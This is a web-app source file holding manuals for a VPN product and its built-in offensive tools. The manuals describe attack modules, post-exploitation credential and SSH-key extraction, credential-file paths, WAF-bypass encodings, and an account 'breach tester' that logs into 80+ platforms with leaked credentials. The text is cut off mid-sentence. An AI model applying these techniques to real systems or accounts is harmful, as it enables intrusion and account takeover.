// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
// Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC — legal@alphauntechnologies.com
// ProxhqVPN Manuals Download Center — subscription-gated comprehensive guides
import React, { useState } from "react";
import { PageSEO } from "@/components/PageSEO";
import { Badge } from "@/components/ui/badge";
import {
  BookOpen, Download, Shield, Wifi, Terminal, Database,
  Search, Zap, Globe, Lock, Eye, Radio, Award,
  Gamepad2, FileText, Network, Cpu, Server, Settings,
  CheckCircle2, ChevronDown, ChevronUp, BookMarked,
  MapPin, Code,
} from "lucide-react";

// ── Manual Definitions ────────────────────────────────────────────────────────
type Manual = {
  id: string;
  title: string;
  subtitle: string;
  version: string;
  pages: number;
  icon: React.ElementType;
  iconColor: string;
  tier: "basic" | "pro" | "both";
  content: string;
};

const MANUALS: Manual[] = [
  // ── VPN BASICS ────────────────────────────────────────────────────────────
  {
    id: "vpn-getting-started",
    title: "ProxhqVPN: Getting Started",
    subtitle: "Installation, first connection, and account setup",
    version: "3.2",
    pages: 24,
    icon: Wifi,
    iconColor: "text-green-400",
    tier: "both",
    content: `ProxhqVPN Getting Started Guide
Version 3.2 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
legal@alphauntechnologies.com | proxhqvpn.com

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Account Setup & Subscription
2. Platform Installation
3. First VPN Connection
4. WireGuard Configuration
5. Kill Switch Setup
6. DNS Protection
7. Device Management
8. Troubleshooting Common Issues

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. ACCOUNT SETUP & SUBSCRIPTION

  Visit proxhqvpn.com and click "Sign Up."
  Choose your subscription:
    • VPN Basic — $6.99/month or $59.99/year
      Full WireGuard VPN, Kill Switch, DNS Shield, Onion Browser,
      Split Tunneling, SmartDNS, 15+ server locations.
    • Command Center Pro — $39.99/month or $349.99/year
      Everything in VPN Basic + full security toolkit:
      OmniStrike, WAF Analyzer, Social Breach Tester, Bug Bounty Hub,
      OSINT Recon, Ghost Chain, SIEM, Canary Tokens, and more.

  Sign in with Google SSO or email/password via Clerk.

2. PLATFORM INSTALLATION

  Web Dashboard (no install required):
    Navigate to proxhqvpn.com after signing in.

  WireGuard Desktop Client:
    1. Go to My VPN → Download App in the sidebar.
    2. Download for Windows, macOS, or Linux.
    3. Import the .conf file from WireGuard Config page.

  Mobile (iOS/Android):
    Install the official WireGuard app from App Store / Google Play.
    Scan the QR code from your WireGuard Config page.

3. FIRST VPN CONNECTION

  1. Navigate to My VPN in the sidebar.
  2. Select a server region from the dropdown.
  3. Click "Connect."
  4. Verify: the IP shown changes to the VPN server's IP.
  5. Run a leak test (Leak Test in sidebar) to confirm no leaks.

4. WIREGUARD CONFIGURATION

  Your WireGuard config is generated automatically. To view it:
  1. Go to WireGuard Config in the sidebar.
  2. Copy the config text or scan the QR code.
  3. Import into the WireGuard client on your device.

  Protocol: WireGuard (UDP 51820)
  Encryption: AES-256-GCM + ChaCha20-Poly1305
  Key exchange: Curve25519

5. KILL SWITCH SETUP

  The Kill Switch blocks ALL traffic if the VPN drops.
  1. Go to Kill Switch in the sidebar.
  2. Enable "Kill Switch."
  3. Your IP is auto-detected and whitelisted so you keep remote access.
  4. Test: disconnect VPN — all traffic should stop.

6. DNS PROTECTION

  Two layers of DNS protection:
  a) DNS Shield — Encrypts DNS queries and uses custom resolvers.
     Enable at: DNS Protection → DNS Shield.
  b) DNS Sinkhole — Blocks 100k+ ad/tracker/malware domains.
     Enable at: DNS Sinkhole (Command Center Pro only).

7. DEVICE MANAGEMENT

  Add up to 5 devices per subscription.
  1. Go to My Devices in the sidebar.
  2. Click "Add Device."
  3. Name the device and generate its WireGuard config.
  4. Import the config on each device.

8. TROUBLESHOOTING

  Can't connect:
  → Check that port UDP 51820 is not blocked by your firewall.
  → Try a different server region.
  → Re-generate WireGuard keys from WireGuard Config page.

  DNS leaks detected:
  → Enable DNS Shield.
  → Set your DNS server to 10.8.0.1 (VPN gateway).

  Slow speeds:
  → Switch to a geographically closer server.
  → Try ChaCha20-Poly1305 cipher if on mobile.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
All rights reserved. Unauthorized distribution prohibited.`,
  },
  {
    id: "wireguard-advanced",
    title: "WireGuard Advanced Configuration",
    subtitle: "Multi-hop, split tunneling, obfuscation, and router setup",
    version: "2.2",
    pages: 32,
    icon: Settings,
    iconColor: "text-blue-400",
    tier: "both",
    content: `WireGuard Advanced Configuration Manual
Version 2.2 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Split Tunneling
2. VPN Gate (Double-Hop)
3. Obfuscation / Stealth Protocol
4. Router Setup (OpenWRT / pfSense)
5. SmartDNS Configuration
6. VPN Coexistence (running two VPNs)
7. Onion Browser (Tor over VPN)
8. IP Exposure Scanner

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. SPLIT TUNNELING

  Route only specific apps or IP ranges through the VPN.

  To configure:
  1. Go to Split Tunneling in the sidebar.
  2. "Exclude mode" — all traffic through VPN EXCEPT listed apps/IPs.
  3. "Include mode" — only listed apps/IPs go through VPN.

  Common use cases:
  • Route all traffic EXCEPT your local printer IP.
  • Route only gaming traffic to reduce lag.
  • Bypass VPN for banking apps that block VPNs.

2. VPN GATE (DOUBLE-HOP)

  Route your traffic through an additional VPN Gate server for
  a second anonymity hop:

  You → ProxhqVPN → VPN Gate Server → Internet

  1. Go to VPN Gate in the sidebar.
  2. Filter by country, speed, or protocol.
  3. Click "Connect via Gate" on any server.
  4. Your traffic is now double-encrypted.

3. OBFUSCATION / STEALTH PROTOCOL

  Hide VPN traffic from deep packet inspection (DPI):
  1. Go to Stealth Protocol in the sidebar.
  2. Enable "XOR Obfuscation" or "HTTPS Tunnel."
  3. Use when on restricted networks (corporate, hotel WiFi, countries
     that block VPN protocols).

4. ROUTER SETUP

  Set up ProxhqVPN on your router to protect your entire network.

  OpenWRT:
  1. Install WireGuard: opkg install wireguard-tools kmod-wireguard
  2. Download your .conf from WireGuard Config page.
  3. Copy to /etc/wireguard/wg0.conf
  4. wg-quick up wg0

  pfSense:
  1. System → Package Manager → Install WireGuard.
  2. VPN → WireGuard → Import your .conf.
  3. Enable and add interface to your LAN rules.

5. SMARTDNS CONFIGURATION

  SmartDNS resolves geo-blocked content without routing all traffic
  through the VPN (faster than full VPN for streaming):

  1. Go to Smart DNS in the sidebar.
  2. Copy the DNS IP shown.
  3. Set your device/router DNS to this IP.
  4. Flush DNS cache: ipconfig /flushdns (Windows) or
     dscacheutil -flushcache (macOS).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "mobile-wireguard-manual",
    title: "Native Mobile WireGuard Client",
    subtitle: "iOS & Android 3-step setup, deep link import, real latency, kill switch & stealth",
    version: "1.0",
    pages: 16,
    icon: Wifi,
    iconColor: "text-green-400",
    tier: "both",
    content: `Native Mobile WireGuard Client — User Manual
Version 1.0 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
All Plans (VPN Basic + Command Center Pro)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview & Requirements
2. Step 1 — Select a VPN Server
3. Step 2 — Generate Your WireGuard Config
4. Step 3 — Import & Activate in WireGuard App
5. Server Latency & Color-Coded Ping Badge
6. View & Copy Configuration
7. Kill Switch (Mobile)
8. DNS Protection Toggle
9. Stealth Mode Toggle
10. Per-Platform Notes (iOS vs Android)
11. Troubleshooting

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW & REQUIREMENTS

The ProxhqVPN mobile app provides a true OS-level WireGuard VPN
connection on iOS and Android. Unlike a WebView-based VPN indicator,
this flow imports a real WireGuard tunnel configuration into the
official WireGuard app (or a compatible app) on your device.

Requirements:
  iOS:    Official WireGuard app from App Store (free)
          iOS 15.0 or later
  Android: Official WireGuard app from Google Play (free)
           Android 8.0 (Oreo) or later

The ProxhqVPN mobile app itself does NOT require VPN permissions.
The actual tunnel is managed entirely by the official WireGuard app.

Note on native tunnel:
  A fully embedded VPN daemon (VpnService on Android /
  Network Extension on iOS) requires Apple entitlements and
  native Expo modules. This will be available in a future release.
  The current flow (import via deep link) provides identical
  security with no performance difference.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. STEP 1 — SELECT A VPN SERVER

Open the ProxhqVPN mobile app.
The main screen shows a 3-step progress indicator at the top:

  Select → Generate → Activate

In the server list, each server card shows:
  • City & Country flag
  • Real-time latency badge (measured via HTTP HEAD ping)
  • Color coding:
      Green  (≤ 80 ms)  — excellent connection
      Yellow (80-200ms) — acceptable
      Red    (> 200ms)  — high latency, choose another server

Tap any server card to select it (highlighted with a border).
The currently selected server is shown in the status bar.

Available servers (4 active nodes):
  Los Angeles (LA63)   — US West Coast
  London (LON62)       — Europe
  Chicago (CHI61)      — US Central
  Tokyo (TYO64)        — Asia Pacific

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. STEP 2 — GENERATE YOUR WIREGUARD CONFIG

After selecting a server, tap "Generate WireGuard Config."

The app calls: GET /api/wireguard?nodeId=<selectedNodeId>
This returns a real per-node WireGuard .conf file containing:
  [Interface]
    PrivateKey = <your device private key>
    Address    = 10.8.0.<N>/24
    DNS        = 10.8.0.1

  [Peer]
    PublicKey  = <node public key>
    Endpoint   = <node IP>:51820
    AllowedIPs = 0.0.0.0/0, ::/0

The config is generated fresh on every tap. Your device gets a
unique IP allocation in the 10.8.0.0/24 range.

Config generation takes 1-3 seconds. A loading indicator
appears while the API processes the request.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. STEP 3 — IMPORT & ACTIVATE IN WIREGUARD APP

After config generation, tap the import button.

iOS — "Open in WireGuard":
  The app opens the deep link:
    wireguard://airdrop/<base64-encoded-config>
  If the official WireGuard iOS app is installed, it opens
  immediately and prompts: "Add Tunnel?"
  Tap "Allow" to import. The tunnel appears in WireGuard's
  tunnel list ready to activate.

  If WireGuard is not installed:
  A Share sheet appears. You can:
    • AirDrop the .conf file to another device
    • Save to Files and open from WireGuard later
  An App Store link appears below for one-tap install.

Android — "Import to WireGuard":
  The app opens the same wireguard:// deep link.
  If WireGuard is installed, it opens directly to the
  "Create Tunnel from QR or File" screen.
  Tap "Import" to complete the process.

  If WireGuard is not installed:
  Google Play Store opens to the WireGuard app listing.
  Install, then return to ProxhqVPN and tap import again.

Activating the tunnel (in WireGuard app):
  1. Tap the tunnel you just imported.
  2. Toggle the switch to ON.
  3. iOS will prompt for VPN permission — tap "Allow."
  4. Android will prompt for VPN permission — tap "OK."
  5. The tunnel activates. Your traffic is now encrypted.

Verify connection:
  Return to ProxhqVPN mobile app.
  Dashboard shows: current public IP (should be the VPN node IP),
  connection status, and bytes sent/received.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

5. SERVER LATENCY & COLOR-CODED PING BADGE

The ProxhqVPN mobile app measures real server latency every 30
seconds using an HTTP HEAD request to each node endpoint.

Ping badges:
  🟢 ≤ 80 ms   — Green  — ideal for streaming and gaming
  🟡 80-200 ms — Yellow — suitable for browsing and work
  🔴 > 200 ms  — Red    — consider switching servers

The latency shown is the HTTPS round-trip time from your device
to the ProxhqVPN API server — not the WireGuard tunnel latency.
Actual VPN latency is typically 5-20ms lower (UDP vs HTTPS).

If all servers show Red:
  → Check your internet connection.
  → If on cellular, try switching to Wi-Fi.
  → The API server may be temporarily under load — wait 30s.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

6. VIEW & COPY CONFIGURATION

After generating a config, tap "View Config" to expand a
read-only configuration panel showing the full .conf text.

In the view panel:
  • Copy button — copies the entire .conf to your clipboard
  • The config text is scrollable if it exceeds the panel height

You can manually paste this config into any WireGuard-compatible
app (e.g., Wireguard for macOS, WireGuard for Windows, etc.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

7. KILL SWITCH (MOBILE)

The Kill Switch toggle in the ProxhqVPN mobile app adds
"AllowedIPs = 0.0.0.0/0, ::/0" and sets "PersistentKeepalive = 25"
in the generated config.

When the WireGuard tunnel is active with these settings:
  • ALL traffic is routed through the VPN (no split tunneling)
  • PersistentKeepalive keeps the tunnel alive through NAT/sleep
  • If the VPN drops, WireGuard's own routing prevents leaks
    (the WireGuard app itself acts as a kill switch on iOS/Android)

To enable:
  Toggle "Kill Switch" ON before tapping "Generate WireGuard Config."
  Re-generate the config and re-import if you had already generated one.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

8. DNS PROTECTION TOGGLE

When DNS Protection is ON, the generated config sets:
  DNS = 10.8.0.1, 1.1.1.1

The first DNS (10.8.0.1) is the ProxhqVPN private resolver.
It blocks ads, trackers, and malware domains (same rule set as
DNS Sinkhole on the web dashboard). The Cloudflare DNS (1.1.1.1)
is a fallback for any domains not resolved by the private resolver.

When DNS Protection is OFF:
  DNS = 1.1.1.1, 8.8.8.8  (Cloudflare + Google, no filtering)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

9. STEALTH MODE TOGGLE

Stealth Mode wraps the WireGuard UDP traffic in an additional
obfuscation layer to bypass deep packet inspection (DPI).

When Stealth Mode is ON:
  • The generated config adds obfuscation headers
  • Endpoint port changes from 51820 to 443 (HTTPS port)
    → Makes VPN traffic look like HTTPS to DPI firewalls
  • Compatible with: corporate networks, hotel Wi-Fi, countries
    that block standard VPN protocols (China, Russia, UAE, etc.)

Note: Stealth Mode requires the node to have obfs4/Shadowsocks
running on port 443. All 4 active nodes support Stealth Mode.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

10. PER-PLATFORM NOTES

iOS specific:
  • WireGuard uses the Network Extension entitlement (no jailbreak needed)
  • The iOS WireGuard app is developed and maintained by the WireGuard project
  • "On-Demand" activation can be set in WireGuard iOS to auto-connect
    when on untrusted Wi-Fi networks
  • Battery impact: WireGuard is highly efficient — typical idle drain
    is < 1% per hour extra vs no VPN
  • Import button label: "Open in WireGuard"

Android specific:
  • WireGuard uses VpnService API (standard Android permission)
  • The Android WireGuard app is available on Google Play and F-Droid
  • Android 10+ allows "Always-on VPN" in Settings → Network →
    Advanced → VPN — set ProxhqVPN/WireGuard as Always-on
  • On some Android OEMs (Samsung, Xiaomi), battery optimization
    may kill the WireGuard app — add it to the "Unrestricted" list
    in Battery settings
  • Import button label: "Import to WireGuard"

Amazon Fire Stick / Fire TV:
  • Install WireGuard from the Amazon Appstore
  • Use the ProxhqVPN mobile app on a phone/tablet to generate
    the config, then sideload the .conf to the Fire device via ADB:
    adb connect <fire-device-ip>:5555
    adb push wg0.conf /sdcard/Download/
  • Import from the WireGuard app on Fire OS

Apple TV (tvOS):
  • WireGuard is available on the Apple TV App Store (tvOS 17+)
  • Import via SharePlay or use the QR code from the WireGuard
    Config page (/wireguard) on the web dashboard

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

11. TROUBLESHOOTING

Deep link does not open WireGuard:
  → Ensure the official WireGuard app is installed and set as
    the default handler for wireguard:// links.
  → On Android: Settings → Apps → WireGuard → Set as default
  → Use "View Config" → Copy, then paste manually in WireGuard.

Config generation fails:
  → Check your internet connection (the app must reach the API).
  → Ensure you are signed in to ProxhqVPN (tap Profile tab to verify).
  → Try a different server node.

Tunnel imports but does not connect:
  → Check that port UDP 51820 (or 443 in stealth mode) is not
    blocked by your carrier or network.
  → Verify the node IP is reachable: ping <node-ip> from another device.
  → Re-generate the config (endpoint IP may have rotated).

Slow speeds after connecting:
  → Switch to a geographically closer server.
  → Toggle Stealth Mode OFF if you are not behind a DPI firewall.
  → Disable PersistentKeepalive by turning off Kill Switch toggle.

IP address shows home IP even with tunnel active:
  → Verify AllowedIPs = 0.0.0.0/0 in the WireGuard tunnel settings.
  → Restart the WireGuard tunnel (toggle OFF then ON).
  → Check for a secondary VPN or proxy app running simultaneously.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
All rights reserved. Unauthorized distribution prohibited.`,
  },
  // ── SECURITY TOOLS ───────────────────────────────────────────────────────
  {
    id: "omnistrike-manual",
    title: "OmniStrike Penetration Testing Suite",
    subtitle: "Full guide to all 13 attack modules, phases, and post-exploitation",
    version: "4.0",
    pages: 48,
    icon: Zap,
    iconColor: "text-red-400",
    tier: "pro",
    content: `OmniStrike Penetration Testing Suite — User Manual
Version 2.2 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
Command Center Pro Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

IMPORTANT: Only use OmniStrike against targets you own or have
explicit written permission to test. Unauthorized use may violate
the Computer Fraud and Abuse Act (CFAA) and equivalent laws.
ALPHA UNLIMITED TECHNOLOGIES LLC assumes no liability.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview & Architecture
2. Attack Modules (13 categories)
3. Orchestration Modes (Salvo / Chain / Custom)
4. Phase Chain Execution (6 phases)
5. QuantumBreach & ShadowVector Advanced Modules
6. Post-Exploitation (ExploitDesktop)
7. Stealth & Tamper Settings
8. Interpreting Results & CVSS Scoring
9. Exporting Reports
10. OmniStrike + Bug Bounty Integration

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW & ARCHITECTURE

  OmniStrike is a full-stack automated penetration testing platform
  embedded directly in ProxhqVPN Command Center Pro. It routes all
  traffic through your VPN tunnel for maximum anonymity.

  Backend: Express API at /api/omnistrike
  Rate limit: 5 scans per minute per IP
  All scans run server-side (not in your browser)

2. ATTACK MODULES

  SQL Injection (sqli)
    Techniques: Boolean-blind, UNION-based, time-based, error-based,
    stacked queries. Tests all URL parameters, POST body fields,
    and JSON API parameters.
    Detection: Response length diff, time delay (>3s), error strings.

  XSS (xss)
    Reflected and DOM-based cross-site scripting.
    Payload encoding: HTML entity, URL encode, Unicode, double encode.
    Tests: URL params, form fields, JSON fields, headers.

  LFI / Path Traversal (lfi)
    File inclusion and directory traversal.
    Paths tested: /etc/passwd, /etc/shadow, /proc/self/environ,
    .env files, wp-config.php, and 15+ other sensitive paths.
    PHP wrappers: php://filter, php://input, data://

  Command Injection (cmdi)
    OS command chaining: ; | && || backtick newline
    Payloads for Linux and Windows targets.
    Detection: Response contains command output (uid, hostname, etc.)

  SSRF (ssrf)
    Server-side request forgery probing internal IPs, localhost,
    cloud metadata (169.254.169.254), and custom internal URLs.

  XXE (xxe)
    XML external entity injection via file:// and HTTP entities.
    Tests XML API endpoints and file upload endpoints.

  SSTI (ssti)
    Server-side template injection for Jinja2, Twig, Freemarker,
    Python/Ruby engines. Detection: mathematical expression evaluation.

  Header Injection (headers)
    Host header, X-Forwarded-For, X-Original-URL, X-Rewrite-URL.
    Used to bypass access controls and auth restrictions.

  CORS Misconfiguration (cors)
    Tests for permissive Access-Control-Allow-Origin across
    multiple crafted origins. Detects credentials=true + wildcard.

  Auth Brute Force (auth)
    Default credentials against /login, /admin, /wp-login, /api/auth.
    Uses a curated list of 100+ default credential pairs.

  NoSQL Injection (nosql)
    MongoDB operator injection: $ne, $gt, $regex, $where.
    Tests JSON API endpoints.

  QuantumBreach (quantumbreach)
    Cache poisoning, GraphQL introspection + injection, CRLF injection,
    Mass assignment, JWT algorithm confusion (alg:none, RS256→HS256),
    Timing side-channel attacks, Open redirect chains, Quantum-weak
    cryptographic implementation detection.

  ShadowVector (shadowvector)
    Novel/unreported vectors:
    • Ghost Param Injection — hidden parameters in REST paths
    • Path Desync — HTTP/1 vs HTTP/2 desync attacks
    • Prototype Pollution — __proto__ contamination in APIs
    • Schema Oracle — type confusion via partial responses
    • Temporal Race Attack — TOCTOU race conditions in auth

3. ORCHESTRATION MODES

  Salvo Mode: Run all selected modules simultaneously against the
  target. Best for quick coverage. Uses one scan ID.

  Chain Mode (Recommended): Run modules in 6 sequential phases.
  Phase 1 findings inform Phase 2 parameters. Most thorough.

  Custom Mode: Select and order modules manually. Useful for
  targeted testing of a specific vulnerability class.

4. PHASE CHAIN EXECUTION

  Phase 1 — Recon (cors, headers):
    Fingerprint CORS policy and auth-bypass headers. Low-noise.

  Phase 2 — Auth & Access (auth, lfi, xxe):
    Default credentials, file inclusion, XML entity injection.

  Phase 3 — Injection (sqli, nosql, ssrf):
    Database injection and server-side request forgery.

  Phase 4 — Code Execution (cmdi, ssti):
    OS command injection and template engine exploitation.

  Phase 5 — Client-Side (xss):
    Cross-site scripting for session hijacking.

  Phase 6 — Advanced Sweep (quantumbreach, shadowvector):
    Novel unreported vectors and advanced attack patterns.

5. POST-EXPLOITATION (EXPLOITDESKTOP)

  When OmniStrike confirms a Remote Code Execution vulnerability,
  ExploitDesktop activates. It provides:

  File Browser:
  • Browse the target server's filesystem
  • View file contents (configs, .env, SSH keys, etc.)
  • List directory permissions

  Terminal:
  • Execute OS commands on the compromised server
  • Pre-loaded with 20+ recon commands (id, env, netstat, etc.)
  • Automatic sensitive data extraction

  Auto-Recon:
  • Automatically runs 20 post-exploitation commands
  • Extracts: credentials, SSH keys, env vars, SUID binaries,
    running processes, cron jobs, network interfaces

6. STEALTH & TAMPER SETTINGS

  Tamper Level (1-5):
    1 = Raw payloads (fastest, most detectable)
    5 = Maximum encoding/obfuscation (slowest, most evasive)

  Stealth Mode:
    Adds random delays between requests (500ms-3s).
    Randomizes User-Agent on each request.
    Reduces concurrent requests.

  Full Auto:
    After a vulnerability is confirmed, automatically enters
    post-exploitation and runs the full recon suite.

7. INTERPRETING RESULTS

  Severity Ratings:
  CRITICAL — Confirmed RCE, SQLi with data extraction, Account takeover
  HIGH — Confirmed injection, SSRF internal access, IDOR
  MEDIUM — CORS with credentials, XSS reflected, Info disclosure
  LOW — Missing headers, error messages, non-exploitable issues

  CVSS Scoring: All findings are scored using CVSSv3.1 base metrics.

8. EXPORTING REPORTS

  Click "Export Report" (JSON or Markdown) in the scan results panel.
  The report includes:
  • Executive summary
  • All findings with CVSS scores
  • Working payloads and URLs
  • Evidence (response excerpts)
  • Remediation recommendations

9. OMNISTRIKE + BUG BOUNTY INTEGRATION

  Use OmniStrike with Bug Bounty Hub:
  1. Select a program in Bug Bounty Hub.
  2. Click "Open OmniStrike."
  3. Enter an in-scope target domain.
  4. Select appropriate modules (check program out-of-scope first!).
  5. Export findings and use the Report Generator.

  ALWAYS ensure your target is in-scope before scanning.
  Register with the bug bounty program before any testing.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "waf-analyzer-manual",
    title: "WAF Analyzer",
    subtitle: "Web Application Firewall detection, fingerprinting, and bypass testing",
    version: "1.4",
    pages: 18,
    icon: Shield,
    iconColor: "text-blue-400",
    tier: "pro",
    content: `WAF Analyzer Manual
Version 1.4 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
Command Center Pro Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. What is WAF Analyzer?
2. WAF Detection Engine
3. Bypass Testing Suite
4. Supported WAF Vendors
5. Interpreting Results
6. Integration with OmniStrike

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. WHAT IS WAF ANALYZER?

  WAF Analyzer detects, fingerprints, and tests bypasses for Web
  Application Firewalls protecting a target URL. It helps security
  researchers understand what protections are in place and identify
  potential bypass techniques.

2. WAF DETECTION ENGINE

  The analyzer sends a series of probe requests:
  • Benign baseline request (establishes fingerprint)
  • Common attack payloads (SQL, XSS, path traversal)
  • Header manipulation probes

  Detection signals:
  • HTTP 403/406/429 on attack payloads (baseline returns 200)
  • WAF-specific headers: X-Sucuri-ID, CF-RAY, X-CDN, etc.
  • Response body markers: Cloudflare, ModSecurity, Akamai blocks
  • Response timing anomalies

3. BYPASS TESTING SUITE

  After WAF detection, the bypass suite tests:

  Encoding Bypasses:
  • Double URL encoding (%25 instead of %)
  • Unicode normalization (ＳＱＬ instead of SQL)
  • HTML entity encoding
  • Base64 + decode() wrappers

  Case Manipulation:
  • Mixed case: SeLeCt, UnIoN
  • Keyword splitting: UN/**/ION, SE/**/LECT

  HTTP-level Bypasses:
  • Chunked transfer encoding
  • HTTP parameter pollution (same param twice)
  • Content-Type confusion (JSON in form-encoded)
  • Large payload fragmentation

4. SUPPORTED WAF VENDORS

  Detection signatures for 25+ WAFs including:
  Cloudflare, AWS WAF, Akamai, Imperva Incapsula, Sucuri,
  ModSecurity, F5 BIG-IP ASM, Barracuda, Fortinet FortiWeb,
  Radware AppWall, Wallarm, Fastly, Nginx + ModSec, CloudFront.

5. INTERPRETING RESULTS

  WAF Detected + Bypasses Found:
  → Report these bypasses to the target's bug bounty program.
  → CVSS for WAF bypass varies: typically Medium (4.0-6.9).

  WAF Detected, No Bypasses:
  → WAF is properly configured. Document the protection.

  No WAF Detected:
  → Target may be unprotected. Prioritize injection testing.

6. INTEGRATION WITH OMNISTRIKE

  When a WAF is detected, OmniStrike automatically increases
  tamper level to 5 and uses the detected bypass techniques
  as payload wrappers for all subsequent module runs.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "social-breach-manual",
    title: "Social & Game Account Breach Tester",
    subtitle: "Authorized account security audit for 80+ platforms",
    version: "1.2",
    pages: 28,
    icon: Gamepad2,
    iconColor: "text-purple-400",
    tier: "pro",
    content: `Social & Game Account Breach Tester — User Manual
Version 1.2 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
Command Center Pro Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

LEGAL NOTICE: This tool is for authorized security testing only.
Only test accounts you own or have explicit written permission to
audit. Unauthorized credential testing is illegal under the CFAA,
GDPR, and equivalent laws worldwide.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview
2. Platform Categories (80+ platforms)
3. Auto vs Manual Login Strategies
4. Session Management
5. Proxy Browser Usage
6. Security Testing Use Cases
7. Session Cleanup

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

  The Social & Game Account Breach Tester helps you:
  • Verify your own account security on 80+ platforms
  • Test whether compromised credentials actually work
  • Audit login flows for security research and bug bounties
  • Maintain authenticated sessions through a built-in proxy browser

  All login attempts and proxy traffic are routed through your
  ProxhqVPN tunnel.

2. PLATFORM CATEGORIES

  Social Media Tab (35+ platforms):
  Facebook, Instagram, Twitter/X, TikTok, Snapchat, Threads,
  LinkedIn, Pinterest, Reddit, Discord, Telegram, Signal, Slack,
  WhatsApp, YouTube, Twitch, Kick, Rumble, GitHub, GitLab, and more.

  Gaming Launchers Tab (10+ platforms):
  Steam (RSA-encrypted login), Epic Games, GOG Galaxy, Blizzard
  Battle.net, Ubisoft Connect, Origin/EA, Activision, Rockstar,
  HoYoverse (Genshin/HSR), Warframe, Path of Exile, Nexon.

  Game Titles Tab (15+ games):
  Roblox, Minecraft, Fortnite (via Epic), Valorant (via Riot),
  League of Legends (via Riot), Call of Duty, Apex Legends (via EA),
  GTA Online (via Rockstar), Overwatch 2 (via Blizzard), and more.

  Legacy Systems Tab (10+ platforms):
  Xbox Live (manual flow), PlayStation Network, Nintendo,
  2K Games, Konami ID, Sega/Atlus, NCSoft (Blade & Soul), and more.

3. AUTO vs MANUAL LOGIN STRATEGIES

  Auto (automated):
  • Platform: Discord, Instagram, Steam, Epic, GOG, Reddit, GitHub,
    Twitch, Roblox
  • How: The backend sends the correct API calls and decrypts
    challenge responses (e.g., Steam RSA encryption) automatically.
  • Result: Full session cookies returned if credentials are valid.

  Manual:
  • Platform: Facebook, Twitter, TikTok, Xbox, PlayStation, etc.
  • How: The proxy browser loads the platform's actual login page.
    You enter credentials in the real login form, which is
    intercepted and proxied through the backend session.
  • Use for platforms with heavy bot detection or OAuth flows.

4. SESSION MANAGEMENT

  After login, sessions are maintained in the backend session store
  (4-hour TTL). Sessions survive page navigation in the app.

  To view active sessions: Scroll to "Active Sessions" in the tool.
  To close a session: Click the × next to any session entry.

  Sessions persist for 4 hours from last activity. After that,
  re-authenticate if needed.

5. PROXY BROWSER USAGE

  The proxy browser embeds the platform page with:
  • All cookies automatically injected
  • All links rewritten through the proxy
  • Navigation history (back/forward)
  • The "BREACH ACTIVE" indicator showing the audit is in progress

  Navigation bar:
  • Type a URL manually to navigate to a specific page
  • Back/Forward buttons follow full session history
  • Refresh reloads the current page with updated session cookies

6. SECURITY TESTING USE CASES

  a) Credential Verification (for your own accounts):
     Test whether leaked credentials from a data breach work on
     any of your registered accounts.

  b) Login Flow Audit (for developers):
     Test your own application's login security by pointing the
     tool at your staging environment.

  c) Session Security Testing:
     After login, test whether the platform properly invalidates
